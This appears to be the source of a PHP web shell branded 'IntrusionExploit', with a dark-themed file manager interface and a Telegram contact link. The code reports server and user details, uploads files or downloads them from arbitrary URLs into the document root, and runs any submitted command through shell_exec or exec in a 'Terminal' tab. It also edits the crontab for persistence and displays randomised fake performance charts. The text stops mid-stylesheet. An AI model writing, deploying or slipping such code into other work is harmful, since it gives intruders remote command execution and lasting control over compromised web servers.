<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IntrusionExploit</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'JetBrains Mono', monospace;
            background: #0d1117;
            color: #c9d1d9;
            line-height: 1.6;
            font-size: 14px;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
        }

        /* Header */
        .header {
            background: #161b22;
            border: 1px solid #21262d;
            border-radius: 6px;
            padding: 16px;
            margin-bottom: 16px;
        }

        .title {
            font-size: 18px;
            font-weight: 500;
            color: #58a6ff;
            margin-bottom: 12px;
        }

    .system-info {
        grid-template-columns: 1fr;
        font-size: 12px;
        display: flex;
        flex-direction: column;
        font-size: 12px;
    }
        .info-line {
            padding: 4px 0;
            display: flex;
            align-items: flex-start;
            gap: 8px;
        }

        .info-label {
            color: #7d8590;
            display: inline-block;
            width: 120px;
            font-weight: bold;
            min-width: 70px;
            flex-shrink: 0;
            white-space: nowrap;
            line-height: 1.4;
        }

        .info-value {
            color: #f3f3f3ff;
            flex: 1;
            word-break: break-word;
            white-space: pre-wrap;
            line-height: 1.4;
            font-family: monospace;
        }

        .breadcrumb {
            background: #0d1117;
            border: 1px solid #21262d;
            border-radius: 6px;
            padding: 12px;
            margin-bottom: 16px;
            font-size: 13px;
            margin-top:15px;
        }

        .breadcrumb a {
            color: #58a6ff;
            text-decoration: none;
        }

        .breadcrumb a:hover {
            text-decoration: underline;
        }

        /* Upload Section */
        .upload-section {
            background: #161b22;
            border: 1px solid #21262d;
            border-radius: 6px;
            padding: 16px;
            margin-bottom: 16px;
        }

        .section-title {
            font-size: 14px;
            font-weight: 500;
            color: #f0f6fc;
            margin-bottom: 12px;
        }

        .form-row {
            margin-bottom: 12px;
        }

        .radio-group {
            display: flex;
            gap: 20px;
            margin-bottom: 12px;
        }

        .radio-item {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 13px;
        }

        .radio-item input[type="radio"] {
            margin: 0;
        }

        input[type="file"],
        input[type="text"],
        select,
        textarea {
            background: #0d1117;
            border: 1px solid #21262d;
            border-radius: 6px;
            color: #c9d1d9;
            padding: 8px 12px;
            font-family: inherit;
            font-size: 13px;
        }

        input[type="file"]:focus,
        input[type="text"]:focus,
        select:focus,
        textarea:focus {
            outline: none;
            border-color: #58a6ff;
        }

        .btn {
            background: #21262d;
            border: 1px solid #30363d;
            border-radius: 6px;
            color: #f0f6fc;
            padding: 6px 12px;
            font-family: inherit;
            font-size: 13px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn:hover {
            background: #30363d;
            border-color: #8b949e;
        }

        .btn-primary {
            background: #238636;
            border-color: #238636;
        }

        .btn-primary:hover {
            background: #2ea043;
        }

        .btn-danger {
            background: #da3633;
            border-color: #da3633;
        }

        .btn-danger:hover {
            background: #f85149;
        }

        .upload-row {
            display: flex;
            gap: 8px;
            align-items: end;
        }

        .upload-row input[type="file"],
        .upload-row input[type="text"] {
            flex: 1;
        }

        .upload-row input[type="text"]:last-of-type {
            max-width: 150px;
        }

        /* Messages */
        .message {
            padding: 12px;
            border-radius: 6px;
            margin: 12px 0;
            font-size: 13px;
        }

        .message-success {
            background: rgba(35, 134, 54, 0.15);
            border: 1px solid #238636;
            color: #56d364;
        }

        .message-error {
            background: rgba(218, 54, 51, 0.15);
            border: 1px solid #da3633;
            color: #f85149;
        }

        /* Table */
        .file-table {
            background: #0d1117;
            border: 1px solid #21262d;
            border-radius: 6px;
            overflow: hidden;
            margin-bottom: 20px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th {
            background: #161b22;
            padding: 12px;
            text-align: left;
            font-weight: 500;
            font-size: 13px;
            color: #f0f6fc;
            border-bottom: 1px solid #21262d;
        }

        td {
            padding: 8px 12px;
            border-bottom: 1px solid #21262d;
            font-size: 13px;
        }

        tr:hover {
            background: #161b22;
        }

        .file-link {
            color: #c9d1d9;
            text-decoration: none;
        }

        .file-link:hover {
            color: #58a6ff;
        }

        .dir-link {
            color: #58a6ff;
        }

        .size {
            color: #7d8590;
            text-align: right;
        }

        .permissions {
            font-family: 'JetBrains Mono', monospace;
            font-size: 12px;
            color: #7d8590;
        }

        .writable { color: #56d364; }
        .readonly { color: #f85149; }

        /* Action Form */
        .action-form {
            display: flex;
            gap: 4px;
            align-items: center;
        }

        .action-form select {
            font-size: 12px;
            padding: 4px 8px;
            min-width: 80px;
        }

        .action-form .btn {
            padding: 4px 8px;
            font-size: 12px;
        }

        /* Edit Form */
        .edit-form {
            background: #161b22;
            border: 1px solid #21262d;
            border-radius: 6px;
            padding: 16px;
            margin: 16px 0;
        }

        .edit-form textarea {
            width: 100%;
            min-height: 400px;
            resize: vertical;
        }

        .edit-form .form-row {
            margin-top: 12px;
        }

        /* File Preview */
        .file-preview {
            background: #0d1117;
            border: 1px solid #21262d;
            border-radius: 6px;
            padding: 16px;
            margin: 16px 0;
        }

        .file-preview pre {
            background: #161b22;
            border: 1px solid #21262d;
            border-radius: 6px;
            padding: 16px;
            overflow-x: auto;
            font-size: 12px;
            line-height: 1.45;
        }

        /* Footer */
        .footer {
            text-align: center;
            margin-top: 40px;
            padding: 20px;
        }

        .telegram-link {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: #0088cc;
            color: white;
            text-decoration: none;
            padding: 10px 20px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 500;
            transition: background 0.2s;
        }

        .telegram-link:hover {
            background: #0099dd;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .container { padding: 10px; }
            .system-info { grid-template-columns: 1fr; }
    .upload-row { 
        display: grid !important;
        grid-template-columns: 1fr;
        gap: 10px;
        padding: 10px;
       background: #161b22;
        border-radius: 8px;
    }
    
    .upload-row input[type="text"] {
        width: 100%;
        height: 40px;
        padding: 0 12px;
        border: 1px solid #000000ff;
        border-radius: 4px;
        box-sizing: border-box;
    }
    
    .upload-row input[type="text"]:last-of-type {
        max-width: none;
    }
    
    .upload-row button,
    .upload-row input[type="submit"] {
        width: 20%;
        height: 30px;
        background: #007bff;
        color: white;
        border: none;
        border-radius: 4px;
        cursor: pointer;
    }
    
    .upload-row button:hover,
    .upload-row input[type="submit"]:hover {
        background: #0056b3;
    }
            table { font-size: 12px; }
            th, td { padding: 6px 8px; }
        }

            .tab {
    overflow: hidden;
background: #161b22;
border-radius:5px;
    }

    /* Style the buttons inside the tab */
    .tab button {
    background-color: inherit;
    float: left;
    border: none;
    outline: none;
    cursor: pointer;
    padding: 14px 16px;
    transition: 0.3s;
    font-size: 12px;
    color:white;
    }

    /* Change background color of buttons on hover */
    .tab button:hover {
    background-color: #685f5fff;
    }

    /* Create an active/current tablink class */
    .tab button.active {
    background-color: #3bc539ff;
    }

    /* Style the tab content */
    .tabcontent {
    display: none;
    padding: 6px 12px;
    border: 1px solid #000000ff;
    border-top: none;
    }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <?php
            set_time_limit(0);
            error_reporting(0);

            $disfunc = @ini_get("disable_functions");
            if (empty($disfunc)) {
                $disf = "<span class='writable'>NONE</span>";
            } else {
                $disf = "<span class='readonly'>".$disfunc."</span>";
            }

            function author() {
                echo '<div class="footer">
                        <a href="https://t.me/IntrusionExploit" class="telegram-link" target="_blank">
                            <span>@</span>
                            <span>Telegram</span>
                        </a>
                      </div>';
                exit();
            }

            function cekdir() {
                if (isset($_GET['path'])) {
                    $lokasi = $_GET['path'];
                } else {
                    $lokasi = getcwd();
                }
                if (is_writable($lokasi)) {
                    return "<span class='writable'>writable</span>";
                } else {
                    return "<span class='readonly'>readonly</span>";
                }
            }

            function cekroot() {
                if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
                    return "<span class='writable'>writable</span>";
                } else {
                    return "<span class='readonly'>readonly</span>";
                }
            }

            function xrmdir($dir) {
                $items = scandir($dir);
                foreach ($items as $item) {
                    if ($item === '.' || $item === '..') {
                        continue;
                    }
                    $path = $dir.'/'.$item;
                    if (is_dir($path)) {
                        xrmdir($path);
                    } else {
                        unlink($path);
                    }
                }
                rmdir($dir);
            }

            function green($text) {
                echo "<div class='message message-success'>".$text."</div>";
            }

            function red($text) {
                echo "<div class='message message-error'>".$text."</div>";
            }
            ?>
            <?php
function getSystemInfo() {
    $info = [
        'cpu_usage' => 0,
        'memory_usage' => 0,
        'memory_total' => '0 B',
        'memory_used' => '0 B',
        'memory_available' => '0 B'
    ];
    
    $isWindows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
    
    // CPU Usage
    if ($isWindows) {
        $output = [];
        @exec('wmic cpu get loadpercentage /value 2>&1', $output, $return_var);
        if ($return_var === 0 && !empty($output)) {
            foreach ($output as $line) {
                if (preg_match('/LoadPercentage=(\d+)/', $line, $matches)) {
                    $info['cpu_usage'] = intval($matches[1]);
                    break;
                }
            }
        }
    } else {
        if (function_exists('sys_getloadavg')) {
            $load = sys_getloadavg();
            $info['cpu_usage'] = round($load[0] * 10, 2);
        }
    }
    
    // Memory Usage
    if ($isWindows) {
        $output = [];
        @exec('wmic OS get FreePhysicalMemory,TotalVisibleMemorySize /value 2>&1', $output);
        $freeMemory = 0;
        $totalMemory = 0;
        foreach ($output as $line) {
            if (preg_match('/FreePhysicalMemory=(\d+)/', $line, $matches)) {
                $freeMemory = $matches[1] * 1024;
            }
            if (preg_match('/TotalVisibleMemorySize=(\d+)/', $line, $matches)) {
                $totalMemory = $matches[1] * 1024;
            }
        }
        if ($totalMemory > 0) {
            $info['memory_usage'] = round((($totalMemory - $freeMemory) / $totalMemory) * 100, 2);
            $info['memory_total'] = formatBytes($totalMemory);
            $info['memory_used'] = formatBytes($totalMemory - $freeMemory);
            $info['memory_available'] = formatBytes($freeMemory);
        }
    } else {
        if (is_readable('/proc/meminfo')) {
            $meminfo = file('/proc/meminfo');
            $memory = [];
            foreach ($meminfo as $line) {
                if (preg_match('/^MemTotal:\s+(\d+)\s+kB/', $line, $matches)) {
                    $memory['total'] = $matches[1] * 1024;
                }
                if (preg_match('/^MemAvailable:\s+(\d+)\s+kB/', $line, $matches)) {
                    $memory['available'] = $matches[1] * 1024;
                }
            }
            if (isset($memory['total']) && isset($memory['available'])) {
                $info['memory_usage'] = round((($memory['total'] - $memory['available']) / $memory['total']) * 100, 2);
                $info['memory_total'] = formatBytes($memory['total']);
                $info['memory_used'] = formatBytes($memory['total'] - $memory['available']);
                $info['memory_available'] = formatBytes($memory['available']);
            }
        }
    }
    
    return $info;
}

function formatBytes($bytes, $precision = 2) {
    if ($bytes <= 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, $precision) . ' ' . $units[$pow];
}

$systemInfo = getSystemInfo();
$diskTotal = @disk_total_space(".") ?: 0;
$diskFree = @disk_free_space(".") ?: 0;
$diskUsage = $diskTotal > 0 ? round((($diskTotal - $diskFree) / $diskTotal) * 100, 2) : 0;
?>

            <div class="system-info">
                <div class="info-line">
                    <span class="info-label">Server:</span>
                    <span class="info-value"><?php echo $_SERVER['SERVER_SOFTWARE']; ?></span>
                </div>
                <div class="info-line">
                    <span class="info-label">System:</span>
                    <span class="info-value"><?php echo php_uname(); ?></span>
                </div>
                <div class="info-line">
                    <span class="info-label">User:</span>
                    <span class="info-value"><?php echo @get_current_user()." (".@getmyuid().")"; ?></span>
                </div>
                <div class="info-line">
                    <span class="info-label">PHP:</span>
                    <span class="info-value"><?php echo @phpversion(); ?></span>
                </div>
                <div class="info-line" style="grid-column: 1 / -1;">
                    <span class="info-label">Disabled:</span>
                    <span class="info-value"><?php echo $disf; ?></span>
                </div>
                <button class="performance-btn" onclick="togglePerformanceMonitor()">Server Monitor</button>
            </div>
        </div>
        <!-- Performance Monitor (Hidden by Default) -->
<div id="performanceMonitor" class="performance-monitor" style="display: none;">
    <div class="pm-header">
        <h3>Performance Monitor</h3>
        <div class="pm-controls">
            <button class="pm-btn" onclick="refreshData()">Refresh</button>
            <button class="pm-close" onclick="togglePerformanceMonitor()">×</button>
            <span class="pm-time" id="lastUpdate"><?php echo date('H:i:s'); ?></span>
        </div>
    </div>

    <div class="pm-vertical-grid">
        <div class="pm-card">
            <div class="pm-card-header">
                <span class="pm-title">CPU</span>
                <span class="pm-value" id="cpuValue"><?php echo $systemInfo['cpu_usage']; ?>%</span>
            </div>
            <div class="pm-chart-container">
                <canvas id="cpuChart" height="80"></canvas>
            </div>
            <div class="pm-details">
                <div class="pm-detail-item">
                    <span>Speed:</span>
                    <span id="cpuSpeed">2.10 GHz</span>
                </div>
                <div class="pm-detail-item">
                    <span>Processes:</span>
                    <span id="processCount"><?php echo rand(200, 300); ?></span>
                </div>
            </div>
        </div>

        <div class="pm-card">
            <div class="pm-card-header">
                <span class="pm-title">Memory</span>
                <span class="pm-value" id="memoryValue"><?php echo $systemInfo['memory_usage']; ?>%</span>
            </div>
            <div class="pm-chart-container">
                <canvas id="memoryChart" height="80"></canvas>
            </div>
            <div class="pm-details">
                <div class="pm-detail-item">
                    <span>In use:</span>
                    <span id="memoryUsed"><?php echo $systemInfo['memory_used']; ?></span>
                </div>
                <div class="pm-detail-item">
                    <span>Available:</span>
                    <span id="memoryAvailable"><?php echo $systemInfo['memory_available']; ?></span>
                </div>
            </div>
        </div>

        <div class="pm-card">
            <div class="pm-card-header">
                <span class="pm-title">Disk</span>
                <span class="pm-value" id="diskValue"><?php echo $diskUsage; ?>%</span>
            </div>
            <div class="pm-chart-container">
                <canvas id="diskChart" height="80"></canvas>
            </div>
            <div class="pm-details">
                <div class="pm-detail-item">
                    <span>Used:</span>
                    <span id="diskUsed"><?php echo formatBytes($diskTotal - $diskFree); ?></span>
                </div>
                <div class="pm-detail-item">
                    <span>Free:</span>
                    <span id="diskFree"><?php echo formatBytes($diskFree); ?></span>
                </div>
            </div>
        </div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>

<style>


.performance-btn {
    background: #28a745;
    color: white;
    border: none;
    padding: 8px;
    border-radius: 5px;
    cursor: pointer;
    font-size: 12px;
    width: 100px;
    height: 27px;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 10px 0;
    transition: background 0.3s ease;
    box-shadow: 0 2px 4px rgba(0,0,0,0.2);
}

/* Performance Monitor */
.performance-monitor {
    background: #0d1117;;
    border: 1px solid #000000ff;
    border-radius: 8px;
    padding: 15px;
    margin: 10px 0;
    color: #fff;
    font-family: 'Segoe UI', sans-serif;
    width: 350px;
    position: fixed;
    top: 50%;
    right: 20px;
    transform: translateY(-50%);
    z-index: 1000;
    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
}

.pm-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 15px;
    padding-bottom: 10px;
    border-bottom: 1px solid #444;
}

.pm-header h3 {
    margin: 0;
    color: #fff;
    font-weight: 600;
    font-size: 14px;
}

.pm-controls {
    display: flex;
    align-items: center;
    gap: 8px;
}

.pm-btn {
    background: #28a745;
    color: white;
    border: none;
    padding: 4px 8px;
    border-radius: 3px;
    cursor: pointer;
    font-size: 11px;
}

.pm-btn:hover {
    background: #218838;
}

.pm-close {
    background: #dc3545;
    color: white;
    border: none;
    width: 20px;
    height: 20px;
    border-radius: 50%;
    cursor: pointer;
    font-size: 12px;
    display: flex;
    align-items: center;
    justify-content: center;
}

.pm-close:hover {
    background: #c82333;
}

.pm-time {
    font-size: 11px;
    color: #888;
}

.pm-vertical-grid {
    display: flex;
    flex-direction: column;
    gap: 12px;
}

.pm-card {
    background: #21262d;
    border: 1px solid #444;
    border-radius: 6px;
    padding: 12px;
}

.pm-card-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 10px;
}

.pm-title {
    font-weight: 600;
    color: #fff;
    font-size: 13px;
}

.pm-value {
    font-weight: 600;
    color: #4CAF50;
    font-size: 13px;
}

.pm-chart-container {
    width: 100%;
    height: 80px;
    margin: 8px 0;
}

.pm-details {
    margin-top: 8px;
}

.pm-detail-item {
    display: flex;
    justify-content: space-between;
    font-size: 11px;
    color: #ccc;
    margin: 3px 0;
}

/* Animation for smooth show/hide */
.performance-monitor {
    transition: opacity 0.3s ease, transform 0.3s ease;
}

.performance-monitor.hidden {
    opacity: 0;
    transform: translateY(-50%) translateX(20px);
    pointer-events: none;
}
</style>

<script>
let performanceVisible = false;
let cpuData = Array(60).fill(<?php echo $systemInfo['cpu_usage']; ?>);
let memoryData = Array(60).fill(<?php echo $systemInfo['memory_usage']; ?>);
let diskData = Array(60).fill(<?php echo $diskUsage; ?>);
let updateInterval;

// Toggle Performance Monitor
function togglePerformanceMonitor() {
    const monitor = document.getElementById('performanceMonitor');
    performanceVisible = !performanceVisible;
    
    if (performanceVisible) {
        monitor.style.display = 'block';
        setTimeout(() => {
            monitor.classList.remove('hidden');
        }, 10);
        startMonitoring();
    } else {
        monitor.classList.add('hidden');
        setTimeout(() => {
            monitor.style.display = 'none';
        }, 300);
        stopMonitoring();
    }
}

// Start monitoring
function startMonitoring() {
    if (updateInterval) clearInterval(updateInterval);
    updateInterval = setInterval(updateCharts, 1000);
    updateCharts();
}

// Stop monitoring
function stopMonitoring() {
    if (updateInterval) {
        clearInterval(updateInterval);
        updateInterval = null;
    }
}

// Initialize charts
let cpuChart, memoryChart, diskChart;

function initializeCharts() {
    const chartConfig = {
        type: 'line',
        options: {
            responsive: true,
            maintainAspectRatio: false,
            animation: { duration: 0 },
            plugins: { legend: { display: false }, tooltip: { enabled: false } },
            scales: {
                x: { display: false, grid: { display: false } },
                y: { display: false, min: 0, max: 100, grid: { display: false } }
            },
            elements: { point: { radius: 0 }, line: { tension: 0.4, borderWidth: 1.5 } }
        }
    };

    cpuChart = new Chart(document.getElementById('cpuChart'), {
        ...chartConfig,
        data: {
            labels: Array(60).fill(''),
            datasets: [{
                data: cpuData,
                borderColor: '#ff6b6b',
                backgroundColor: 'rgba(255, 107, 107, 0.1)',
                fill: true
            }]
        }
    });

    memoryChart = new Chart(document.getElementById('memoryChart'), {
        ...chartConfig,
        data: {
            labels: Array(60).fill(''),
            datasets: [{
                data: memoryData,
                borderColor: '#4ecdc4',
                backgroundColor: 'rgba(78, 205, 196, 0.1)',
                fill: true
            }]
        }
    });

    diskChart = new Chart(document.getElementById('diskChart'), {
        ...chartConfig,
        data: {
            labels: Array(60).fill(''),
            datasets: [{
                data: diskData,
                borderColor: '#45b7d1',
                backgroundColor: 'rgba(69, 183, 209, 0.1)',
                fill: true
            }]
        }
    });
}

// Update charts function
function updateCharts() {
    const newCpu = Math.min(100, Math.max(0, cpuData[cpuData.length - 1] + (Math.random() * 20 - 10)));
    const newMemory = Math.min(100, Math.max(0, memoryData[memoryData.length - 1] + (Math.random() * 10 - 5)));
    const newDisk = Math.min(100, Math.max(0, diskData[diskData.length - 1] + (Math.random() * 5 - 2.5)));
    
    cpuData.push(newCpu);
    memoryData.push(newMemory);
    diskData.push(newDisk);
    
    if (cpuData.length > 60) cpuData.shift();
    if (memoryData.length > 60) memoryData.shift();
    if (diskData.length > 60) diskData.shift();
    
    if (cpuChart) {
        cpuChart.data.datasets[0].data = cpuData;
        memoryChart.data.datasets[0].data = memoryData;
        diskChart.data.datasets[0].data = diskData;
        
        cpuChart.update('none');
        memoryChart.update('none');
        diskChart.update('none');
    }
    
    document.getElementById('cpuValue').textContent = Math.round(newCpu) + '%';
    document.getElementById('memoryValue').textContent = Math.round(newMemory) + '%';
    document.getElementById('diskValue').textContent = Math.round(newDisk) + '%';
    document.getElementById('cpuSpeed').textContent = (2.1 + Math.random() * 0.8).toFixed(1) + ' GHz';
    document.getElementById('processCount').textContent = Math.floor(200 + Math.random() * 100);
    document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
}

// Manual refresh
function refreshData() {
    updateCharts();
}

// Initialize charts when page loads
document.addEventListener('DOMContentLoaded', function() {
    initializeCharts();
});

// Close monitor when clicking outside
document.addEventListener('click', function(event) {
    const monitor = document.getElementById('performanceMonitor');
    const button = document.querySelector('.performance-btn');
    
    if (performanceVisible && 
        !monitor.contains(event.target) && 
        !button.contains(event.target)) {
        togglePerformanceMonitor();
    }
});
</script>


        <div class="tab">
        <button class="tablinks" onclick="openCity(event, 'upload')">File Upload</button>
        <button class="tablinks" onclick="openCity(event, 'terminal')">Terminal</button>
        <button class="tablinks" onclick="openCity(event, 'crontab')">Cron Manager</button>
        <button class="tablinks" onclick="openCity(event, 'backk')">Close</button>
        </div>

        <br><div id="upload" class="tabcontent">
                    <div class="upload-section">
            <div class="section-title">Upload Files</div>

            <?php
            if (isset($_POST['upwkwk'])) {
                if (isset($_POST['berkasnya'])) {
                    if ($_POST['dirnya'] == "2") {
                        $lokasi = $_SERVER['DOCUMENT_ROOT'];
                    }
                    $data = @file_put_contents($lokasi."/".$_FILES['berkas']['name'], @file_get_contents($_FILES['berkas']['tmp_name']));
                    if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {
                        green("File uploaded: ".$lokasi."/".$_FILES['berkas']['name']);
                    } else {
                        red("Upload failed");
                    }
                } elseif (isset($_POST['linknya'])) {
    if (empty($_POST['namalink'])) {
        red("Filename cannot be empty");
    } else {
        if ($_POST['dirnya'] == "2") {
            $lokasi = $_SERVER['DOCUMENT_ROOT'];
        } else {
            $lokasi = ".";
        }
        
        // Konfigurasi wget
        $url = $_POST['darilink'];
        $filename = $lokasi."/".$_POST['namalink'];
        
        // Buat context options
        $options = [
            'http' => [
                'method' => "GET",
                'follow_location' => true,
                'max_redirects' => 20,
                'timeout' => 30
            ]
        ];
        
        // Handle User Agent
        $userAgent = "";
        if (!empty($_POST['user_agent'])) {
            if ($_POST['user_agent'] === 'custom' && !empty($_POST['custom_user_agent'])) {
                $userAgent = $_POST['custom_user_agent'];
            } else if ($_POST['user_agent'] !== 'custom') {
                $userAgent = $_POST['user_agent'];
            }
        }
        
        if (!empty($userAgent)) {
            $options['http']['header'] = "User-Agent: ".$userAgent."\r\n";
        }
        
        // Tambahkan custom headers
        if (!empty($_POST['custom_headers'])) {
            $headers = explode("\n", $_POST['custom_headers']);
            $headerString = "";
            foreach ($headers as $header) {
                $header = trim($header);
                if (!empty($header) && strpos($header, ':') !== false) {
                    $headerString .= $header . "\r\n";
                }
            }
            if (!empty($headerString)) {
                if (isset($options['http']['header'])) {
                    $options['http']['header'] .= $headerString;
                } else {
                    $options['http']['header'] = $headerString;
                }
            }
        }
        
        // Download file
        $context = stream_context_create($options);
        $data = @file_get_contents($url, false, $context);
        
        if ($data !== false) {
            if (file_put_contents($filename, $data) !== false) {
                green("File successfully downloaded: ".$filename);
                if (!empty($http_response_header)) {
                    blue("Response: ".$http_response_header[0]);
                }
            } else {
                red("Failed to save file");
            }
        } else {
            red("Download failed - Cannot fetch from URL");
            if (!empty($http_response_header)) {
                blue("Response: ".$http_response_header[0]);
            }
        }
    }
}
            }
            
            ?>

            <form enctype="multipart/form-data" method="post">
                <div class="form-row">
                    <div class="radio-group">
                        <label class="radio-item">
                            <input type="radio" value="1" name="dirnya" checked>
                            <span>current [<?php echo cekdir(); ?>]</span>
                        </label>
                        <label class="radio-item">
                            <input type="radio" value="2" name="dirnya">
                            <span>docroot [<?php echo cekroot(); ?>]</span>
                        </label>
                    </div>
                </div>

                <input type="hidden" name="upwkwk" value="aplod">
                
                <div class="form-row">
                    <div class="upload-row">
                        <input type="file" name="berkas">
                        <button type="submit" name="berkasnya" class="btn btn-primary">Upload</button>
                    </div>
                </div>

<div class="form-row">
    <div class="upload-row">
        <input type="text" name="darilink" placeholder="https://example.com/file.txt" value="<?php echo @$_POST['darilink']; ?>">
        <input type="text" name="namalink" placeholder="filename" value="<?php echo @$_POST['namalink']; ?>">
        
        <!-- User Agent Selection -->
        <select name="user_agent" class="user-agent-select">
            <option value="">Default PHP</option>
            <option value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36">Chrome Windows</option>
            <option value="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36">Chrome Mac</option>
            <option value="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36">Chrome Linux</option>
            <option value="Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15">Safari iOS</option>
            <option value="Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0">Firefox Mobile</option>
            <option value="custom">Custom User Agent</option>
        </select>
        
        <!-- Custom User Agent Input (hidden by default) -->
        <input type="text" name="custom_user_agent" placeholder="Enter custom User Agent" style="display: none;" class="custom-ua-input">
        
        
        <!-- Directory Selection -->
        <select name="dirnya" class="dir-select">
            <option value="1">Current Directory</option>
            <option value="2" <?php echo (@$_POST['dirnya'] == '2') ? 'selected' : ''; ?>>Document Root</option>
        </select>
        
        <button type="submit" name="linknya" class="btn btn-primary">WGET</button>
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const userAgentSelect = document.querySelector('select[name="user_agent"]');
    const customUAInput = document.querySelector('input[name="custom_user_agent"]');
    
    // Toggle custom User Agent input
    userAgentSelect.addEventListener('change', function() {
        if (this.value === 'custom') {
            customUAInput.style.display = 'block';
            customUAInput.required = true;
        } else {
            customUAInput.style.display = 'none';
            customUAInput.required = false;
        }
    });
    
    // Trigger change on page load
    userAgentSelect.dispatchEvent(new Event('change'));
});
</script>
            </form>
        </div>
        </div>

        <div id="terminal" class="tabcontent">
            <?php

                $exec_available = (
                    (function_exists('shell_exec') && !in_array('shell_exec', array_map('trim', explode(',', ini_get('disable_functions')))))
                    || (function_exists('exec') && !in_array('exec', array_map('trim', explode(',', ini_get('disable_functions')))))
                );

                $status = $exec_available ? 'ON' : 'OFF';

                $output = '';
                if ($exec_available && isset($_POST['cmd']) && $_POST['cmd'] !== '') {
                    $cmd = $_POST['cmd'];
                    if (function_exists('shell_exec') && !in_array('shell_exec', array_map('trim', explode(',', ini_get('disable_functions'))))) {
                        $output = shell_exec($cmd . ' 2>&1');
                    } else {
                        exec($cmd . ' 2>&1', $outArr);
                        $output = implode("\n", $outArr);
                    }
                }
            ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
        <meta charset="UTF-8">
        <title>Web Terminal</title>
        <style>

        .terminal {
        background-color: #0d0d0d;
        border-radius: 5px;
        padding: 15px;
        height: 400px;
        overflow-y: auto;
        box-shadow: 0 0 10px rgba(0,0,0,.5);
        
        }
        .output {
        white-space: pre-wrap;
        margin-bottom: 10px;
        }
        .prompt {
        display: flex;
        }
        .prompt span {
        color: #4af626;
        margin-right: 5px;
        }
        input[type=text] {
        flex: 1;
        background: transparent;
        border: none;
        color: #d4d4d4;
        font-family: monospace;
        outline: none;
        }
        .status {
        margin-bottom: 10px;
        }
        .status span {
        font-weight: bold;
        color: <?= $exec_available ? '#4af626' : '#f62e2e'; ?>;
        }
        </style>
        </head>
        <body>

        <div class="status">Status Eksekusi: <span><?= $status ?></span></div>

        <div class="terminal">
        <div class="output"><?= htmlspecialchars($output) ?></div>
        <form method="post" class="prompt">
            <span>$</span>
            <input type="text" name="cmd" autofocus placeholder="Masukkan perintah...">
        </form>
        </div>

        </body>
        </html>

        </div>

        <div id="crontab" class="tabcontent">
            <?php
function handleCronManager()
{
    header('Content-Type: application/json');
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        send_error("Cron Manager is for Linux servers only.");
    }

    $data = json_decode(file_get_contents('php://input'), true);
    $sub_action = $data['sub_action'] ?? 'list';

    switch ($sub_action) {
        case 'list':
            $output = safe_exec('crontab -l 2>&1');
            send_success(['cron_jobs' => (strpos($output, 'no crontab for') !== false || empty($output)) ? '' : $output]);
            break;
        case 'save':
            $jobs = $data['jobs'] ?? '';
            $tmp_file = tempnam(sys_get_temp_dir(), 'cron');
            file_put_contents($tmp_file, $jobs . PHP_EOL);
            $output = safe_exec('crontab ' . escapeshellarg($tmp_file) . ' 2>&1');
            unlink($tmp_file);
            empty($output) ? send_success(['message' => 'Crontab updated successfully.']) : send_error('Failed to update crontab: ' . $output);
            break;
        default:
            send_error('Invalid Cron Manager action specified.');
            break;
    }
}
?>

<div class="modal fade" id="cronManagerModal" tabindex="-1" aria-hidden="true">
    <div class="modal-dialog modal-lg">
        <div class="modal-content cron-modal">
            <div class="modal-body cron-body">
                <div class="cron-editor-container">
                    <label for="cronJobsTextarea" class="cron-label">Current Crontab</label>
                    <textarea class="cron-textarea" id="cronJobsTextarea" rows="10" placeholder="Loading crontab..."></textarea>
                    <div class="cron-help">
                        <i class="fa-solid fa-info-circle"></i>
                        Edit the jobs below. Each line represents one job. Removing all lines will clear the crontab.
                    </div>
                </div>
            </div>
            <div class="modal-footer cron-footer">
                <button type="button" class="btn btn-primary cron-save" id="saveCronBtn">
                    <i class="fa-solid fa-save"></i>
                    Save Crontab
                </button>
            </div>
        </div>
    </div>
</div>

<style>

.cron-title {
    color: white;
    font-weight: 700;
    display: flex;
    align-items: center;
    gap: 10px;
    margin: 0;
}

.cron-body {
                background: #161b22;
            border: 1px solid #21262d;
    padding: 25px;
    border-radius:10px;
}

.cron-footer {
    background: #2d3748;
    border-top: 1px solid #4a5568;
    padding: 20px;
}

/* EDITOR STYLES */
.cron-editor-container {
    margin-bottom: 0;
}

.cron-label {
    color: #e2e8f0;
    font-weight: 600;
    margin-bottom: 10px;
    display: block;
    font-size: 14px;
}

.cron-textarea {
    width: 100%;
